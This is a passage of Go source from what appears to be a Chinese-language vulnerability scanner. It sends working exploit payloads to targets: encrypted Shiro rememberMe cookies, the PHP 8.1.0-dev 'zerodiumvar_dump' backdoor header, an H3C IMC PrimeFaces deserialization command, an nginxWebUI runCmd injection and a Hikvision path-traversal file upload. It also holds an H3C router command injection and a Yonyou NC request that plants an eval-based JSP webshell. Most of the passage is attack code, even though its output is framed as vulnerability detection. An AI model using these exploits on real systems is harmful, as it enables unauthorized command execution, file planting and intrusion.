[]string{"9NzFe08tottstCwpXjV/lHyYhIZnoVyO+zu1gk3WoWkHiF0xhj4f1Htd5w7OWFrpnsM/e0WX1E/WICCfDGUqtg4wslgRcMROJGgF5H3pPjvghEj1O3U6kj+lQgzJVyPdmSgfarLIwoicuieobaW1iFKtKj461wpfTCKhuza+70igvLaB142Qw5JuOhiCpuJ72JghLxLuhHoRjk+zGzTl7sEbRH8+WaFqPTmJONdQnJ4NCZRyexG059UE7j/aBbEQOZ8DuywIH5zSgZudJvBZoJJAnFZfbLATzdFmL6qISrUzstPZgOYN+L7qzwOmzEmhIS8XVuxP4qnKM/6+glCRWLWc7fouqtxN1t/ap3SmwFIVW6w38FTDAXjPF2ywmwDKdZa/esNNEcplIVH7U/t3nR6xIQYUb4tpg8uelfyU66A6O59oO7cDMqJ+Upbgaknw30E5a6iczeaBCWna1o6Y2VrnEdLzWSLgcLtYZZs/J23Vn2jGFt1/1etbtjvdhdMsE1y/2jUyxaSsFl1fLTTgyDCxStZ/cXigm7cPy1aylag="},
					"lxuEtAWbv+SgUOXREM+zrA==": []string{"HMOSRNvT8uQq1FiTKK/qZBbtZoUShsLfw5ZBj8Uw0P+eLcx/RcthU1yMs24vEsT1CveVYhq56YklfdJEAWACP4WlpQFEWVk0RN5o0xzCZxh9Wy8YdIiRlv93wK8yEvqo7cRy6MCb1uszQmrUtNlSpVT8P3ybG4foGZpVLdosEMyAIGqif0cX6l0IrrehSyl/V9p6mRYiA3mM1FqPtjSp+faO29dfzWwp44fLWMebJ2cCEYtHVfY8futYusbWfJUNcQr3NLFq6VTcOs2ZjqN6mMLOZ3HD9Cl2OIM1MjUm6868PtY6x0f3bq06i5/OsbQhUdTpAT8LWgP7NF3WytttOIy9Zs0W4K39AIemxGpW0o52QhnPyH9hJyvp15s081bqNcCmvdZjPyFadqzAsL9DnaudaF0duualygBQgEjof7dCeC8R8REDcsJyuG5RQJk6bX39vC7vfP5IGN5mrcHrE8s7UCZR3AKXl/eFS37ikUaoINa2nGRTSUZX+KDJgK02m+Dv2bYVjl2QJIigeltCzCw1f7ZCdgEcacWLWf36OaM="},
					"HoTP07fJPKIRLOWoVXmv+Q==": []string{"m75grc/rLjZuQ2XILD7N915dMBdo1uKoknQlpiBqWN2WhVhghVoFOsvgdtLAvpHSA+5f2Of0oUIYNy3jVONYIrgZLCJIRTiDJm4Wvujv8HwBTMsPo0r8XtJPaQGaz+ZkISXQDLdnHZy0Guz68ZynK2ZI7DYeBss4LjxS8NoxmujOV8IMWx1IrxhdY47Jbc1a3zqxwLQS8nBs35YczNuQxJVsI4HpUpfkALk9LohyLrN5Bj3ZdKBVuZ5sd0IZ1tc2behdjR4etMlYkrD4tfZpifsq3GsHT9n5MpmpQzhQdvDvbTgM4kdB/X7EbagNau0N+qpayx/Qcxp1jmrqaBfKxDdKy5at52B4k12v+6dtvRIB0Ua/8hEdvAwFaVhxAOB1FviQCTiCa2AmFbVw1SkWmnZs10NRVDXepdzOxJOvkg7iOegbnuFoLH35N3jPitE9ZLV71TWkW5qTJBl623+CpOQtXIWTdsZ0xDtwbsGhnxaaspq0YE4ugLh5WtzDtjo+vRN2xw+Ypgewx15hWMpjFxb3xEuhRelELKQHIUmbHzM="},
					"Is9zJ3pzNh2cgTHB4ua3+Q==": []string{"wWHtjKwtqTCTksGwobphKVKGQwa9Dym4RCgj9V3au/TzhuZ18uubWGQ96HmuI/Tbnsykyti0LKw1fDgb7mpGb+ixrIsdZEnfqz2YZKT+bKlZ61eRGRjZFUzMsAK27L9i81e1DR4j/F/5UzE16D4PSzoi2zyr8uN9V/M6Hwd6ESidZ1dW8ji7M7Im7YWzwg0SY6RQxTHj+30yVQAuhZWFY9CDxhi+5TIuHUw1CrMHY5bSPDCirf9EBbPjwcopCvwSNNYYW7f/HwS/NGRl2TZGh9H7uCWwclb03G7MWdElRLywZiDEE9rIF5Tu+f+FmYW8gJTXv5hu7gJflLTvoWIVZ6DjRsnWA2AQAcqREYgvRbMG/2YnFqvOtIu+No2ma83+memufDv6MhaswQ55oywNFWxZNCmacR0k9wUvadm1g06EFGAT4jSJnM0EBSgkiHqHx+hj1cC2uKXVDpNXRFBT6d3YYCYLP9iZtokrTY92jisvOyHaBT/Ajblhkzy4slruUOrP9PUyfT+s+40XTc7k1jmQDuD+GxC/N/lbTUcTWGU="},
					"empodDEyMwAAAAAAAAAAAA==": []string{"XH1jRHDFPGxkA/GXSQ8Wf6y+gWQY8Y11dDxnvKQy7pFthZJOSYMkOZMgqmrGK39h+oPJC+UOydqzH6G7552cgd93GqSvjl06jGMWuTTJUPOE5S2/PZgZNkicyb9l4abPHjTQvUeSustFEEtBQX83IGrTYQzvuEXsEznw/AlrGIFHLUh/uOmgzkDzlF6kv4KlEVGcpE7FHDE/kBGHpxQMyT8Eka88rdMXH5R2d1jHvoLKfjRRJwxYUcFiF301NQgP8ZGd5fbEDxikEfUkTIKxG7d9DSFVJOJsVrjhJ9XRtfY6wpwHX/kI1U0D/9lttKQL7U9BSSpJ8Hago/+om3C7LypJFu4vDA+ntTIdO0XHmpRzWnrkurZYnX0JrYdFThvlqkCAgVKeKfgkMeb9UwHNZMBIc41U5jnwECWjctHr7SRErhOOSqQfpgPCe4lG/1fq2X1jgMFe0CD5dG53aYd0GdzKg9ZS9tOvjh/aoC/24G9nVxd+y9eXkjCEMAOzoa8JwC7rIKyLpgz7X364l8rQaNGtIhJgn7WasMXwWnbzgXo="},
					"A7UzJgh1+EWj5oBFi+mSgw==": []string{"K9KN+EMlF81hzaETBtBq8TccUSKh+aJl0Mx0ET8cgERrocsovJKrNemC2PfUFdhwPy5Up7m47txaMPuN4E0VzfK4p+3ObwTujyEF7b2MNqyVVmzx3MOT9Ls4jEr0eImr+cSirdFPBmzMaiP3skwSX8Eg1YmP5sJQW0ZvrF9nR9z9AGEFMi1UguEZezjliLEpUGY+g5Tad723iBgd3Q/2rGIjo6eXf0lH0iTDpfZM/Oq2HUUz+nPcajZey4GsaaTFWt8nKyhJBTSDWTErrnE41NtpyYFPp4UWQWRzcXlg7cqVZHS+AQ/Jp6CPGbXY5P9Z763HN55cSWbiGrRnZCQyi+sVR0H1okTaB7hwif9ouaaW61dPHPxMDdlcI7cEV8uI4eS1zDfzdTyvjbhlvfQgTIajENn1gHKu/xTVGG6gJ8Ix8wO1eDloet1EOcFZ0tgHs4nKpZoRmaCw75b6at9v9QX1qUniZ8TKr4Au0BCIKT6uTM+S/DHQ1FOsR3vh6TG3Ri5DUmj1TOILFtpRCcntAKgg1/X+H/FgjipePZqOQ9o="},
					"c2hpcm9fYmF0aXMzMgAAAA==": []string{"5+iZUeoglwkizt6lMYbovmoo5VBrQeI/MSLg1lrJ4FKlH6dBgVKNFIJCeSSVqcsAmzRmHQX4P22sRhXcAzt3JBxE92OpsHJCQ4pA9A3Dx05fUZLnR6r0njDCN3Sd+S5D92jrk9vRrfQ3rNiRz5uCpoQVh541IOt9FAwja9Xfq4Oa/2oKscKPM8q6MLdU3Th77J/1GmeJznNfzwbt9r+uTCYss7oSUVRVSBZVIC4gTVMDYzvg3GfzdQom8QDEKbp3BMiB/aQkMqYNQ5la3SLUL9rGvQEfD46ZdInW7LlWNWWd8wTx+3RMB1WLLu18BYzy0FUWlJASaLOlwWWghLZggsOQRrjYZq0ygOZqpUYoD6It2quJjO41BExwUz1+WUR1Dk+KSrv+B14R65z13OI46JYz553XJBnEN4w+z/8PuHewHs6+scd5kgsRWdOT6fRNYshFFU2Ob1UJeu/kWg6c+4oIsRUcZr2S58BNNwUr31Fb/bl905qRFOl7wC8nLeWPjrxsG5dsYsh98ArJArDjte2e5TgsCwzNsvPJSWuV9lY="},
					"i45FVt72K2kLgvFrJtoZRw==": []string{"LDgM2RLvDhLB/GDDDXwlSmyl5frMbggtfZ7UQbpM6t4VK0QVCYcHNCifWY7WPZaEZO5nKBJr59KcgvyD7ffLU3BEYkXcb0XaGzn88Ds+BbYzZgtmuG87VdwkjhyWrKPxMh4/eZncALoxiw6ISO/0YlCq+Io0JCK5EsZeMystJEnKzVP/jjaaIC+ISLZJdAqWEycknyKY+1z0eZwKfc15hoBMpn7/HxV4ieatitE/lHrh/qMHgTWZZM1tPg+NzbXIu1eksgcWOhIBeZ19XuT+AT6WZ/1e2JWOt1pqdXpa3J8AOh2KDMKCkpfMQNHkx0YZrhG68t2td5sa8iKRdmohMWOY4FTJM1AuH98aLVciXMNuH68LFDpY09y68FF4mo0ifHeFuurdJRGkPpErm0O+OrKPwt6GhmvS8KA+zUl4idX/1VAlLAvKnIXZaskQA+lGkpLD3U/BP9/wYYtpyQcgi+NqlyxIYPIwx+eO66v+QkNYvTqEWOcs4AcWaQ5AX/mFIVGLTNdr8wmoLHgLKtdP7JOhMV4R6wAERVq3baCqxhI="},
					"U3BAbW5nQmxhZGUAAAAAAA==": []string{"Jofo1QeruwgPYjNN0o1XVduySoOFloaICyWvGB8xB1rku0uhfoQPXP3hgPmjfF9zxLLBlbuE2b/73UxuEJ1sNS8oH88savOgnxSQnGQV5tE8MoxsEqKgXS28hAcInj6CQyLZkgfWHI8mUojWiiH1siyJe5DlfBDwivHJBNi6P5yjePJQ1qWCiLdrsPFxHX+5PDdEb2XGbO8cxDRPLLH4rKVF9cSqH+1F85DRpamvqqe9rX6c0UsORxFx2eN1VjWzO0RH8RLpWCrEsWENIVqTknPPeBImcjyGWNOsqePIP3nxUb/xTfWjFEUg4W70DLy8EflDLxrF/xsADRzxruCDVqu+3p1j2mGYfR6LHRLSelwv7gksdeDdFpasKcO+WAxcgxME7dj3WWLueQ9mRDnQqAWIFrIIX3RPlxS/Ou0GK9BYVzFWJ6cUPUy9yGFDFFIwKwyw6erJ6G0aRvmHyYDFBErdF5PZ1WW0UQ1U1ghS5JsHjf5gHhaiApEUEuroYrYzRTO8wL4MIx9NRuovsgWMwn156QodqrRNyiHev3Pmb1A="},
					"Jt3C93kMR9D5e8QzwfsiMw==": []string{"CKKIsDg2JMQjigmtHHz58eeL9W/DLONPBEkMyZqnDYD4azkq1H/VJM4oTKkz9F42W5MdyxpabueKFPeery9fSjNy1cH8ByvgSLkcrFVhTq0lRLY04be4oLWjXAHq2MMycdyozEhmzvQ3rcTh4/7Vzb2ziQ0iroHH38vXUVsYUkE/qr+BH1cEAh/hC/k4ge40W3tNHaK3hyT6Eh9Dpn7+8lAk0jAOV8ZGA/16TSQOMtjVq4EOzCBwUCauORXXbKu2OwSdrisoRvfzQbXA/mLyInJIU/eRXoJHZmcuDMzn9ebCCs265ProdjJqEsV8coByhDxOr7J+vwJ3Z9DQyfLf1xBJzQ5FqYIoD1tbhijAFu+oUJcCO8CcbqZhPESxXkFpPfiNP5IrpCxIypFiUpvRxdsDRMEE6I5QnfudsCmDTMIOP/q8HwtkuFyomzgYUUaarOWjqoP798PKanto5xd4KLmlC5Sc5PA7rG17Zin0L5+z9df9jtHANhwaErmitf73mvj09AyoV1G8MpcdxywChzOoOdUCoAyQOHIFcVH+7TM="},
					"MTIzNDU2NzgxMjM0NTY3OA==": []string{"uqVaApvtdZdkyLCSe2aatuSvwhECUuHqCDL0fA618hm7b2wAS9LbGNbtzHmsPlS89YZUuMUvrV8EhzZwu2jQrHGVVHbotzrGKpwcwyENqD3cafuULIkgk512EgJpMvCzWIEXhA7Szc3MGr9btkzxel0hODyJkhCghgJ/LQpPRmH+GuXuaEbIXSrD4bddmIWgqJjPEULFMVC3AMEG4W3kcLP3dbg7/jBrN10+B8pjEy5TTf/tILF3GMhyGDPWVCIakHCbQNOowvG29JI3gESSMyEVy2zlx+sz+xBi4UrAJYckT+etD2XCfDsHissff3nMVMi5WSVqygaFra2UTa2q9jp/NkO8C+8XpBI9MuupOeXVlaFNUhJA+Ce/0hTyiVqg5cb0bySIIQvwjHCqK+Dbgl19CGIaRftvuSxZHrjih/qPCcDu4Yc+oNGP+qeKbO8BlVFcspxqIiaibtyKHSBiHApPSEujhI+k/HWqqzYH7tOnzjrcNd8LoxECBdb4Qv3EWKfliUsXg5TAtqIW1UkF4B//doAze/SA4LKCQ/WdU8A="},
					"vXP33AonIp9bFwGl7aT7rA==": []string{"k5JerpAVAXUDlQrjm5F4aT0jigsf3qa49i7caYN8m/wLfRxKaP83KAKuwa4oFhkjLve3wDi3YUDj1JBBvVTIx7HhHxeO2z5VaPCZde9kq/2pp0+R3qzvFlRQa3O6s5iNSkSPti6UOfXwEeIR9xBi0rvhfWPDHt95G+TTR9bdiN6SKQbggRRUhloO1aqIRdm2GDEmwWQXf0756dKNiVayU+OFEIYrgIRJAIcSGBLrZrIurcD2bKlamdI0pAMln2CkHTKKsBfDzG0j04tkFhXcM/SnOh+SohLP5ddOD/OdVUNxmM42tlQ8lyCIPKU48qgYQRwgF/lAVux5N8cOqNtVUOO13PtDPxJyycnVcKnQ+RIlXf0x9QUJW1JZD+YRIEpZyuisNJW70UddJypP2YcnbiuNXGni0a/PBP9bxJXLmejq1SdtpL2GGUOeeiciys0kaEIsldhHGuGAUQvSBAlpd8YOm6S7HSgh8ZNtHPWcFbEazyL12P9mnDTXQwmtPdljpRAvNyHm52LiK+aPzILDwl26xcxhXhDq4Eznv5W4lvU="},
					"V2hhdCBUaGUgSGVsbAAAAA==": []string{"hFyL3b+toX9F69S6dw88ue27+TK3lQp1CQZt3K52AzL1V0RL/JkAhrvVOOT8tMUk6+Aq6Jor3lHkm1EnjjQZMZ41S0AtmTzXOXOZgkbRKjtsvp9AK4VYugC9PIV8lToI57XbQCvu+yuCVnFMk3Kvb/9FwJqN0KUJ52+w0IoGP28UjPlqgqc9IuKFh4t3a2qZBDipBl7FYCzt6B40rk7cCzzfqm106AdoABsZd68hLwG/1+Pyo177jhvsFfQtZCeERPy8wmMgCvECBKE+yCW36I+YUTPklqipSPKpZdTGJgC5Jn6TjxfSDvpXx2bTmkjoZ1JWi9WENiZadO1R3Zk+1+kX/vFl0nKNjEN1AdOsLADxqIk70NDgbN8tmH1Nxq//M195VeAqgFZiqwvn+cB7/r8+dZvhXx25WWvka0u6LXFV8J0bV+1WAXjQhB/xKCxAuI67Lqma3OQ7OFHbwrzEUNh4Wo8NBdIaScYdwK9ZoQ0A4Ks9klFg/EaEWr39C+dbGP39GE8Ddp9VUdsJUHnuDLeCAjUkJ1XAwRgauWXMiM4="},
					"Q01TX0JGTFlLRVlfMjAxOQ==": []string{"LCR/PdrkxDRYCq4Wj2kK59JYNb4m5sVI6QXKV10gjOBdfAHN9liVdY10suB04rdM1FC8VQUuDD1pbOGzsA+x/k4YC90qrLqn9qKcZ2OXMWaKoV6YBkV8oonYc5k40VVTjXOs35tTR9ftZZuEvLlY2I/dEmwLg71eDSj4Zb9CQD5fR1/5R+A/0CS0oQBiazyVg7oXcUEahTScmgSeXDUmnuVgDNYWjoP/ZYWsHIVWVMDk7TN+ietvBL5AyZ5FHTDQSh67VjVIGJ6JiHMfFY+YEIkaxkAhPZVaC3R9CbAvcRHqXDpuL44Q3cXd7B4UfHczTrffvz3IVgzl+3xK9l13teof6u2LFHOvfKYx/5EcsEhKPW3yjyZlvBwDhoRSL1CrO7b80utMRDO4OzqHvnZ2YLVklLIch95SuGzHsH2a++IabaUdTM+jO33yyCXCcAVQBxUP7VmHXGreqwOYl1O59i/NNo0Vvuu9eEq2OOqE1WCOPgRLHBeknWHq3IS+AFZxY3eF8tV+bGthYovRZea8cNZg/9pUG3lbuVSMDLY0cN8="},
					"66v1O8keKNV3TTcGPK1wzg==": []string{"hF4AN/CHT0Lm8NhymLwsu+qdDfD51Iu+w20ZkIu3rkNNckfh3bnMxP/TxeZLGyyOigYu+fqzUUOivV++OLtE6EweCG791gm9P+rDaMz9nNPVRarK1n/m7hNbgy3d4+regnEYEkSQF6TZTuwwmYLvRlMhO9xCcayamJ9YJIzFBNn7A6vakU15EKNWgsXUc0Pi65tBnxFS9zOdbokux4jH8uxFh5h4vcStNDYs1LbiwABrq+rgs1aHgrayDsReJBUjL0K6SfMu8mo6ljpN6ONPmwiTdCd2uGmKOY49GsjnGCaDUqBJ7DfrzOM+BFvYNq3jVD+p4/AAWyppE77g87+fNpFPYDYVDuiwVPOZ1gGfM/9tuFwOLeicW4RE0t6ceStphiRc2HhRDwM+dzfCF3Hkc+0U/uFRxrp+EkJ8YSUWw5Xat6LofoPZHQLGTNSYnDYrinPHFIFHi+YIW1UE/u1gakJrv1UvKtZlXblEBRM7qypDXdM4adXBhIS8dR1DqZbMNEVZpEnsA2FyJrGv6JyQIbpyXkIu1uhDjlmoqgpJtY0="},
					"SDKOLKn2J1j/2BHjeZwAoQ==": []string{"mCPAMufTIgWYnkYaOMLGL98kB4Q4SU9xpo5nV/TxOMNYLPEC8TUkJLMiSs6sUA1/ywCd7A+YqxfbUB26AXW0Ii6XCwAxG8ZiIw9XUtMMT7hbaFRF/JZVgCqYek5Yl/xqJvhC42gu4dn89evIO2m2kA5fvpWcWlyWoeDHAxeudE1JAtkNi5YNXFfUjoMSZO40S7I84djNG4gisP6lQeu8Dkz/VxcViQHb6yuA/Cvbwye/9IMXv4cBVed3gYhkPxp6yL7C5D2AwQoa7bmXYAXZP6BtQN0Kuj4UX72XHTa8IZYA8Pq0TjH1YSnGoapLfAg6Le3yNA/LMkhd9yTaH47wsE/S+U/Y8D7DNK/McEJqrNebtVBS2/tdR+riVWHrqSajqnofTlvCLqKxz0hz73/ofCqewZ+pOQ6/fDnRE4T/Dr/A7EkpX4kIZt1skwy7K6tL7ZO/mZBqGOlYSRjQKXLbnYKNq24JK6AwW0efwU2Is9NZEtbjfQCZpd+idLf0mMQigwMP0jDXohF51ckoCFMVHsNuHvEZNHF41zvnqBN4n8U="},
				}
				for key, payloads := range payloads {

					for _, payload := range payloads {
						req, err := http.NewRequest("GET", aas.Url, nil)
						if err != nil {
							fmt.Println(err)
							continue
						}

						req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
						req.AddCookie(&http.Cookie{Name: "rememberMe", Value: payload})

						resp, err := client.Do(req)
						if err != nil {
							fmt.Println(err)
							continue
						}

						defer resp.Body.Close()

						if resp.StatusCode == http.StatusOK && !containsRememberMeDeleteMe(resp.Header.Get("Set-Cookie")) {
							color.RGBStyleFromString("237,55,36").Println("[+] 存在shiro密钥：" + key)
						}
					}
				}

			}

			//php
			if strings.Contains(aas.Cms, "PHP/8.1.0-dev") {
				headers := map[string][]string{
					"User-Agent":  {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"},
					"User-Agentt": {"zerodiumvar_dump(233*233);"},
				}
				vurl := aas.Url
				request, err := http.NewRequest("GET", vurl, nil)
				if err != nil {
					continue
				}
				request.Header = headers
				response, err := client.Do(request)
				if err != nil {
					continue
				}
				defer response.Body.Close()
				bodyby, err := ioutil.ReadAll(response.Body)
				if err != nil {
					continue
				}
				if strings.Contains(string(bodyby), "int(54289)") {
					color.RGBStyleFromString("237,55,36").Println("[+] 存在漏洞PHP 8.1.0-dev 开发版本后门")
				}

			}
			//H3C IMC
			//H3C IMC dynamiccontent.properties.xhtm 远程命令执行
			if strings.Contains(aas.Cms, "H3C") {
				h3c_rce_res := h3c_rce(aas.Url)
				if h3c_rce_res != "" {
					fmt.Println(h3c_rce_res)
				}

				headers := http.Header{}
				headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
				headers.Set("Content-Type", "application/x-www-form-urlencoded")

				vurl := aas.Url + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml"

				data := "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=echo%20asdfgyhjikelxmwox"
				req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
				if err != nil {
					fmt.Println("创建请求时出错:", err)
					continue
				}
				req.Header = headers
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				bodys := string(body)
				if strings.Contains(bodys, "asdfgyhjikelxmwox") {
					color.RGBStyleFromString("237,55,36").Println("[+] 存在H3C IMC dynamiccontent.properties.xhtm 远程命令执行漏洞")
					color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + vurl)
				}

			}
			//nginxWebUI
			if strings.Contains(aas.Cms, "nginxWebUI") {
				targeturl := aas.Url + "/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx"
				resp, err := client.Get(targeturl)
				if err != nil {
					continue
				}
				defer resp.Body.Close()
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				bodyStr := string(bodyBytes)
				if strings.Contains(bodyStr, "uid") {
					color.RGBStyleFromString("237,55,36").Println("[+] 存在nginxWebUI远程命令执行漏洞")
					color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + targeturl)
				}

			}
			//海康威视综合安防管理平台
			if strings.Contains(aas.Cms, "海康威视综合安防管理平台") {
				//海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
				url := aas.Url + "/center/api/files;.js"
				body := &bytes.Buffer{}
				writer := multipart.NewWriter(body)
				part, err := writer.CreateFormFile("file", "../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/go_test123.txt")
				if err != nil {
					fmt.Println(err)
					return
				}
				part.Write([]byte("go_nishizhu"))

				writer.Close()

				req, err := http.NewRequest("POST", url, body)
				if err != nil {
					fmt.Println(err)
					return
				}
				req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)")
				req.Header.Set("Content-Type", writer.FormDataContentType())

				//client := &http.Client{}
				resp, err := client.Do(req)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer resp.Body.Close()

				respBody, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(err)
					return
				}
				bodys := string(respBody)
				if strings.Contains(bodys, "webapps/clusterMgr") {
					vurl := aas.Url + "/clusterMgr/go_test123.txt;.js"
					get_resp, err := client.Get(vurl)
					if err != nil {
						continue
					}
					defer get_resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(get_resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "go_nishizhu") {
						color.RGBStyleFromString("237,55,36").Println("[+] 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + vurl)
					}

				}
			}
			//Nacos
			if strings.Contains(aas.Cms, "Nacos") {
				//Nacos弱口令
				Nacos_password_result := Nacos_password(aas.Url)
				if Nacos_password_result != "" {
					fmt.Println(Nacos_password_result)
				}
				//Nacos未授权访问
				Nacos_unauthorized_result := Nacos_unauthorized(aas.Url)
				if Nacos_unauthorized_result != "" {
					fmt.Println(Nacos_unauthorized_result)
				}
				//jwt secret key 硬编码绕过
				Nacos_jwt_result := Nacos_jwt(aas.Url)
				if Nacos_jwt_result != "" {
					fmt.Println(Nacos_jwt_result)
				}
				//开启授权后identity硬编码绕过
				Nacos_identity_result := Nacos_identity(aas.Url)
				if Nacos_identity_result != "" {
					fmt.Println(Nacos_identity_result)
				}
			}

			//Apache Tomcat
			if strings.Contains(aas.Cms, "Apache Tomcat") {
				Apache_Tomcat_res := tomcat_rce(aas.Url)
				if Apache_Tomcat_res != "" {
					fmt.Println(Apache_Tomcat_res)
				}
			}

			//宏景eHR
			if strings.Contains(aas.Cms, "宏景eHR人力资源信息管理系统") {
				hj_eHR_res := hj_eHR(aas.Url)
				if hj_eHR_res != "" {
					fmt.Println(hj_eHR_res)
				}
				hj_eHR_rce_res := hj_eHR_rce(aas.Url)
				if hj_eHR_rce_res != "" {
					fmt.Println(hj_eHR_rce_res)
				}
			}
			//金蝶云星空
			if strings.Contains(aas.Cms, "金蝶云星空") {
				jdyxk_res := jdyxk(aas.Url)
				if jdyxk_res != "" {
					fmt.Println(jdyxk_res)
				}
			}
			//大华智慧园区综合管理平台
			if strings.Contains(aas.Cms, "大华智慧园区综合管理平台") {
				dhzh_res := dhzh(aas.Url)
				if dhzh_res != "" {
					fmt.Println(dhzh_res)
				}
			}

		}

		if brute == "yes" {
			if strings.Contains(aas.Cms, "FTP") {
				ftp_bp(aas.Url)
			}
		}

	}

	if s.Output != "" {
		outfile(s.Output, s.AllResult)
	}
}

// H3C多系列路由器前台RCE漏洞
func h3c_rce(url string) string {
	bodys := ""
	vurl := url + "/goform/aspForm"
	vurl1 := url + "/lemonlove777"
	data := "CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/lemonlove777);"
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Dial: (&net.Dialer{
				Timeout: 5 * time.Second, // 设置连接超时时间
			}).Dial,
		},
	}
	req, err := http.NewRequest("POST", vurl, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
	maxRetries := 3
	retryCount := 0
	for retryCount < maxRetries {
		resp, err := client.Do(req)
		if err != nil {
			retryCount++
			continue
		}
		defer resp.Body.Close()
		resp1, err := client.Get(vurl1)
		if err != nil {
			return ""
		}
		defer resp1.Body.Close()
		body, err := ioutil.ReadAll(resp1.Body)
		if err != nil {
			return ""
		}
		bodys = string(body)
		if resp1.StatusCode == http.StatusOK {
			//fmt.Println("存在漏洞")
			return "[+] 存在H3C多系列路由器前台RCE漏洞,漏洞URL：" + vurl
		}
		break

	}
	return bodys
}

// 用友nc前台任意文件上传
func yync_qt(url string) string {
	bodys := ""
	vurl := url + "/uapjs/jsinvoke/?action=invoke"
	data := `{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/lemonlove777.jsp"]}`

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Dial: (&net.Dialer{
				Timeout: 5 * time.Second, // 设置连接超时时间
			}).Dial,
		},
	}
	req, err := http.NewRequest("POST", vurl, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return ""
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
	maxRetries := 3
	retryCount := 0

	for retryCount < maxRetries {
		resp, err := client.Do(req)
		if err != nil {
